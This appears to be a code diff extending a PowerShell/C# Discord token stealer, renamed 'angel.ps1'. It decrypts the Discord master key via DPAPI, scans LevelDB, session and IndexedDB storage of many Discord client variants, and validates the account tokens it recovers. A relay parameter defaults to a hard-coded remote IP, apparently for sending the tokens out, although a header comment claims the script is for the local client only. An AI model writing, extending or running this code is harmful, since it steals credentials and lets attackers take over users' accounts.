@@ -1,5 +1,5 @@
 # Discord token extractor (Windows, local Discord client only)
-# Run: powershell -ExecutionPolicy Bypass -File .\get-discord-token.ps1
+# Run: powershell -ExecutionPolicy Bypass -File .\angel.ps1
 
 param(
     [string]$RelayUrl = "http://89.34.90.212:8000/text"
@@ -22,9 +22,20 @@ if (-not ([System.Management.Automation.PSTypeName]'DiscordCryptoHelper').Type) 
 using System;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Text.RegularExpressions;
 
 public static class DiscordCryptoHelper
 {
+    private static readonly Regex UserTokenRe = new Regex(
+        @"^[A-Za-z0-9_-]{17,28}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,50}$",
+        RegexOptions.Compiled);
+    private static readonly Regex MfaTokenRe = new Regex(
+        @"^mfa\.[A-Za-z0-9_-]{84,}$",
+        RegexOptions.Compiled);
+    private static readonly Regex TokenFindRe = new Regex(
+        @"(?:mfa\.[A-Za-z0-9_-]{84,}|[A-Za-z0-9_-]{17,28}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,50})",
+        RegexOptions.Compiled);
+
     [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
     private struct DataBlob
     {
@@ -131,6 +142,9 @@ public static class DiscordCryptoHelper
 
     public static byte[] Unprotect(byte[] encryptedKey)
     {
+        if (encryptedKey == null || encryptedKey.Length == 0)
+            return null;
+
         var input = new DataBlob();
         input.pbData = Marshal.AllocHGlobal(encryptedKey.Length);
         input.cbData = encryptedKey.Length;
@@ -153,21 +167,177 @@ public static class DiscordCryptoHelper
         }
     }
 
-    public static string DecryptToken(byte[] masterKey, byte[] encrypted)
+    public static byte[] GetMasterKey(byte[] encryptedKey)
     {
-        if (encrypted == null || encrypted.Length < 31 || masterKey == null)
+        if (encryptedKey == null || encryptedKey.Length < 5)
             return null;
 
-        var nonce = new byte[12];
-        var tag = new byte[16];
-        var cipher = new byte[encrypted.Length - 31];
+        byte[] blob = encryptedKey;
+        if (encryptedKey.Length > 5 &&
+            encryptedKey[0] == 0x44 && encryptedKey[1] == 0x50 &&
+            encryptedKey[2] == 0x41 && encryptedKey[3] == 0x50 && encryptedKey[4] == 0x49)
+        {
+            blob = new byte[encryptedKey.Length - 5];
+            Array.Copy(encryptedKey, 5, blob, 0, blob.Length);
+        }
 
-        Array.Copy(encrypted, 3, nonce, 0, 12);
-        Array.Copy(encrypted, encrypted.Length - 16, tag, 0, 16);
-        Array.Copy(encrypted, 15, cipher, 0, cipher.Length);
+        var key = Unprotect(blob);
+        if (key == null && blob != encryptedKey)
+            key = Unprotect(encryptedKey);
+        if (key == null)
+            return null;
 
-        var plain = DecryptAesGcm(masterKey, nonce, cipher, tag);
-        return plain == null ? null : Encoding.UTF8.GetString(plain);
+        if (key.Length > 32)
+        {
+            var trimmed = new byte[32];
+            Array.Copy(key, trimmed, 32);
+            return trimmed;
+        }
+        return key;
+    }
+
+    public static bool IsValidToken(string token)
+    {
+        if (string.IsNullOrWhiteSpace(token))
+            return false;
+
+        token = token.Trim();
+        for (int i = 0; i < token.Length; i++)
+        {
+            if (token[i] > 127)
+                return false;
+        }
+
+        if (token.StartsWith("eJ") || token.StartsWith("eN") || token.StartsWith("H4s"))
+            return false;
+
+        if (MfaTokenRe.IsMatch(token))
+            return true;
+
+        if (!UserTokenRe.IsMatch(token))
+            return false;
+
+        string uidB64 = token.Split('.')[0];
+        byte[] raw;
+        try
+        {
+            raw = FromBase64Flexible(uidB64);
+        }
+        catch
+        {
+            return false;
+        }
+        if (raw == null)
+            return false;
+
+        string uid;
+        try
+        {
+            uid = Encoding.ASCII.GetString(raw);
+        }
+        catch
+        {
+            return false;
+        }
+
+        ulong id;
+        if (uid.Length < 16 || uid.Length > 20 || !ulong.TryParse(uid, out id))
+            return false;
+
+        ulong ts = (id >> 22) + 1420070400000UL;
+        ulong now = (ulong)DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();
+        if (ts < 1420070400000UL || ts > now + 365UL * 24UL * 3600UL * 1000UL)
+            return false;
+
+        return true;
+    }
+
+    public static string FindFirstValidToken(string text)
+    {
+        if (string.IsNullOrEmpty(text))
+            return null;
+        text = text.Trim().Trim('\0').Trim().Trim('"');
+        if (IsValidToken(text))
+            return text;
+        foreach (Match m in TokenFindRe.Matches(text))
+        {
+            if (IsValidToken(m.Value))
+                return m.Value;
+        }
+        return null;
+    }
+
+    public static byte[] FromBase64Flexible(string value)
+    {
+        if (string.IsNullOrEmpty(value))
+            return null;
+
+        var sb = new StringBuilder(value.Length);
+        for (int i = 0; i < value.Length; i++)
+        {
+            char c = value[i];
+            if (c == '-') c = '+';
+            else if (c == '_') c = '/';
+            if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
+                (c >= '0' && c <= '9') || c == '+' || c == '/' || c == '=')
+                sb.Append(c);
+        }
+
+        string s = sb.ToString().TrimEnd('=');
+        int pad = (4 - (s.Length % 4)) % 4;
+        if (pad > 0) s += new string('=', pad);
+        if (s.Length < 4)
+            return null;
+
+        try
+        {
+            return Convert.FromBase64String(s);
+        }
+        catch
+        {
+            return null;
+        }
+    }
+
+    public static string DecryptToken(byte[] masterKey, byte[] encrypted)
+    {
+        if (encrypted == null || encrypted.Length < 16 || masterKey == null || masterKey.Length == 0)
+            return null;
+
+        if (masterKey.Length > 32)
+        {
+            var k = new byte[32];
+            Array.Copy(masterKey, k, 32);
+            masterKey = k;
+        }
+
+        if (encrypted.Length >= 31 && encrypted[0] == (byte)'v' && encrypted[1] == (byte)'1' &&
+            (encrypted[2] == (byte)'0' || encrypted[2] == (byte)'1' || encrypted[2] == (byte)'2'))
+        {
+            var nonce = new byte[12];
+            var tag = new byte[16];
+            var cipher = new byte[encrypted.Length - 31];
+            Array.Copy(encrypted, 3, nonce, 0, 12);
+            Array.Copy(encrypted, encrypted.Length - 16, tag, 0, 16);
+            Array.Copy(encrypted, 15, cipher, 0, cipher.Length);
+
+            var plain = DecryptAesGcm(masterKey, nonce, cipher, tag);
+            if (plain != null)
+                return Encoding.UTF8.GetString(plain).TrimEnd('\0').Trim().Trim('"');
+        }
+
+        var legacy = Unprotect(encrypted);
+        if (legacy == null)
+            return null;
+        return Encoding.UTF8.GetString(legacy).TrimEnd('\0').Trim().Trim('"');
+    }
+
+    public static string DecryptTokenB64(byte[] masterKey, string b64)
+    {
+        var enc = FromBase64Flexible(b64);
+        if (enc == null)
+            return null;
+        return DecryptToken(masterKey, enc);
     }
 
     private static byte[] DecryptAesGcm(byte[] key, byte[] nonce, byte[] cipher, byte[] tag)
@@ -213,7 +383,7 @@ public static class DiscordCryptoHelper
 '@
 }
 
-function Read-SharedFileText {
+function Read-SharedFileBytes {
     param([string]$Path)
 
     try {
@@ -224,11 +394,15 @@ function Read-SharedFileText {
             [System.IO.FileShare]::ReadWrite -bor [System.IO.FileShare]::Delete
         )
         try {
+            if ($fs.Length -le 0) { return [byte[]]@() }
             $bytes = New-Object byte[] $fs.Length
-            if ($fs.Length -gt 0) {
-                [void]$fs.Read($bytes, 0, $bytes.Length)
+            $offset = 0
+            while ($offset -lt $bytes.Length) {
+                $n = $fs.Read($bytes, $offset, $bytes.Length - $offset)
+                if ($n -le 0) { break }
+                $offset += $n
             }
-            return [System.Text.Encoding]::GetEncoding(28591).GetString($bytes)
+            return $bytes
         }
         finally {
             $fs.Dispose()
@@ -236,6 +410,46 @@ function Read-SharedFileText {
     }
     catch {
         return $null
+    }
+}
+
+function Get-SearchTexts {
+    param([byte[]]$Bytes)
+
+    if ($null -eq $Bytes -or $Bytes.Length -eq 0) { return @() }
+
+    $ascii = [System.Text.Encoding]::GetEncoding(28591).GetString($Bytes)
+    $noNull = $ascii.Replace([char]0, '')
+
+    $texts = New-Object System.Collections.Generic.List[string]
+    [void]$texts.Add($ascii)
+    if ($noNull -ne $ascii) {
+        [void]$texts.Add($noNull)
+    }
+
+    if (($Bytes.Length % 2) -eq 0 -and $Bytes.Length -ge 2) {
+        try {
+            $utf16 = [System.Text.Encoding]::Unicode.GetString($Bytes)
+            if (-not [string]::IsNullOrEmpty($utf16)) {
+                [void]$texts.Add($utf16)
+            }
+        }
+        catch { }
+    }
+
+    return $texts
+}
+
+function Add-ValidToken {
+    param(
+        [string]$Candidate,
+        [System.Collections.Generic.HashSet[string]]$Found
+    )
+
+    if ([string]::IsNullOrWhiteSpace($Candidate)) { return }
+    $token = [DiscordCryptoHelper]::FindFirstValidToken($Candidate)
+    if ($token) {
+        [void]$Found.Add($token)
     }
 }
 
@@ -248,25 +462,36 @@ function Add-TokensFromText {
 
     if ([string]::IsNullOrEmpty($Raw)) { return }
 
-    $tokenRe = [regex]'[\w-]{18,}\.[\w-]{6}\.[\w-]{25,}|mfa\.[\w-]{80,}'
-    $encRe   = [regex]'dQw4w9WgXcQ:[A-Za-z0-9+/=]+'
-
+    $tokenRe = [regex]'(?:mfa\.[A-Za-z0-9_-]{84,}|[A-Za-z0-9_-]{17,28}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,50})'
     foreach ($m in $tokenRe.Matches($Raw)) {
-        [void]$Found.Add($m.Value)
+        Add-ValidToken -Candidate $m.Value -Found $Found
     }
 
     if (-not $MasterKey) { return }
 
+    $encRe = [regex]'dQw4w9WgXcQ:([A-Za-z0-9+/=_-]{60,400})'
     foreach ($m in $encRe.Matches($Raw)) {
-        $b64 = ($m.Value -replace '^dQw4w9WgXcQ:', '').TrimEnd('"')
         try {
-            $enc = [Convert]::FromBase64String($b64)
-            $dec = [DiscordCryptoHelper]::DecryptToken($MasterKey, $enc)
-            if ($dec -and $tokenRe.IsMatch($dec)) {
-                [void]$Found.Add($dec)
-            }
+            $dec = [DiscordCryptoHelper]::DecryptTokenB64($MasterKey, $m.Groups[1].Value)
+            Add-ValidToken -Candidate $dec -Found $Found
         }
         catch { }
+    }
+
+    $jsonEncRe = [regex]'(?i)"(?:token|tokens|accessToken|access_token)"\s*:\s*"([^"]{20,400})"'
+    foreach ($m in $jsonEncRe.Matches($Raw)) {
+        $val = $m.Groups[1].Value
+        if ($val -like 'dQw4w9WgXcQ:*') {
+            $b64 = $val.Substring(13)
+            try {
+                $dec = [DiscordCryptoHelper]::DecryptTokenB64($MasterKey, $b64)
+                Add-ValidToken -Candidate $dec -Found $Found
+            }
+            catch { }
+        }
+        else {
+            Add-ValidToken -Candidate $val -Found $Found
+        }
     }
 }
 
@@ -277,16 +502,54 @@ function Get-TokensFromLevelDb {
     )
 
     $found = [System.Collections.Generic.HashSet[string]]::new()
-
-    @(
+    $files = @(
         Get-ChildItem -Path $LevelDbPath -File -Filter *.ldb -ErrorAction SilentlyContinue
         Get-ChildItem -Path $LevelDbPath -File -Filter *.log -ErrorAction SilentlyContinue
-    ) | ForEach-Object {
-        $raw = Read-SharedFileText -Path $_.FullName
-        Add-TokensFromText -Raw $raw -MasterKey $MasterKey -Found $found
+        Get-ChildItem -Path $LevelDbPath -File -Filter LOG -ErrorAction SilentlyContinue
+    )
+
+    foreach ($file in $files) {
+        $bytes = Read-SharedFileBytes -Path $file.FullName
+        if ($null -eq $bytes) { continue }
+        foreach ($raw in (Get-SearchTexts -Bytes $bytes)) {
+            Add-TokensFromText -Raw $raw -MasterKey $MasterKey -Found $found
+        }
     }
 
     return $found
+}
+
+function Get-MasterKeyFromLocalState {
+    param([string]$LocalStatePath)
+
+    $bytes = Read-SharedFileBytes -Path $LocalStatePath
+    if ($null -eq $bytes -or $bytes.Length -eq 0) { return $null }
+
+    $text = [System.Text.Encoding]::UTF8.GetString($bytes)
+    $keyB64 = $null
+
+    try {
+        $json = $text | ConvertFrom-Json
+        if ($json.os_crypt.encrypted_key) {
+            $keyB64 = [string]$json.os_crypt.encrypted_key
+        }
+    }
+    catch { }
+
+    if (-not $keyB64) {
+        $m = [regex]::Match($text, '"encrypted_key"\s*:\s*"([^"]+)"')
+        if ($m.Success) { $keyB64 = $m.Groups[1].Value }
+    }
+
+    if (-not $keyB64) { return $null }
+
+    try {
+        $encKey = [DiscordCryptoHelper]::FromBase64Flexible($keyB64)
+        return [DiscordCryptoHelper]::GetMasterKey($encKey)
+    }
+    catch {
+        return $null
+    }
 }
 
 function Get-DiscordRoots {
@@ -297,6 +560,15 @@ function Get-DiscordRoots {
         "$env:APPDATA\discordcanary"
         "$env:APPDATA\DiscordPTB"
         "$env:APPDATA\discordptb"
+        "$env:APPDATA\DiscordDevelopment"
+        "$env:APPDATA\Lightcord"
+        "$env:APPDATA\lightcord"
+        "$env:APPDATA\Vesktop"
+        "$env:APPDATA\vesktop"
+        "$env:APPDATA\Legcord"
+        "$env:APPDATA\legcord"
+        "$env:APPDATA\ArmCord"
+        "$env:APPDATA\armcord"
         "$env:LOCALAPPDATA\Discord"
         "$env:LOCALAPPDATA\discord"
         "$env:LOCALAPPDATA\DiscordCanary"
@@ -322,30 +594,48 @@ function Get-DiscordRoots {
     return $roots
 }
 
+function Get-StorageDirs {
+    param([string]$Root)
+
+    $dirs = New-Object System.Collections.Generic.List[string]
+    $seen = @{}
+
+    function Add-Dir([string]$Path) {
+        if (-not $Path -or -not (Test-Path $Path)) { return }
+        $key = $Path.ToLowerInvariant()
+        if ($seen.ContainsKey($key)) { return }
+        $seen[$key] = $true
+        [void]$dirs.Add($Path)
+    }
+
+    Add-Dir (Join-Path $Root "Local Storage\leveldb")
+    Add-Dir (Join-Path $Root "Session Storage")
+
+    $idb = Join-Path $Root "IndexedDB"
+    if (Test-Path $idb) {
+        Get-ChildItem $idb -Directory -ErrorAction SilentlyContinue | ForEach-Object {
+            if ($_.Name -match 'leveldb') {
+                Add-Dir $_.FullName
+            }
+            Get-ChildItem $_.FullName -Directory -Filter "*leveldb*" -ErrorAction SilentlyContinue | ForEach-Object {
+                Add-Dir $_.FullName
+            }
+        }
+    }
+
+    return $dirs
+}
+
 $allTokens = [System.Collections.Generic.HashSet[string]]::new()
 
 foreach ($root in (Get-DiscordRoots)) {
     $masterKey = $null
     $localState = Join-Path $root "Local State"
     if (Test-Path $localState) {
-        try {
-            $json = Get-Content $localState -Raw | ConvertFrom-Json
-            if ($json.os_crypt.encrypted_key) {
-                $encKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
-                $payload = $encKey[5..($encKey.Length - 1)]
-                $masterKey = [DiscordCryptoHelper]::Unprotect($payload)
-            }
-        }
-        catch { }
+        $masterKey = Get-MasterKeyFromLocalState -LocalStatePath $localState
     }
 
-    $storagePaths = @(
-        (Join-Path $root "Local Storage\leveldb")
-        (Join-Path $root "Session Storage")
-    )
-
-    foreach ($storagePath in $storagePaths) {
-        if (-not (Test-Path $storagePath)) { continue }
+    foreach ($storagePath in (Get-StorageDirs -Root $root)) {
         $tokens = Get-TokensFromLevelDb -LevelDbPath $storagePath -MasterKey $masterKey
         foreach ($t in $tokens) { [void]$allTokens.Add($t) }
     }
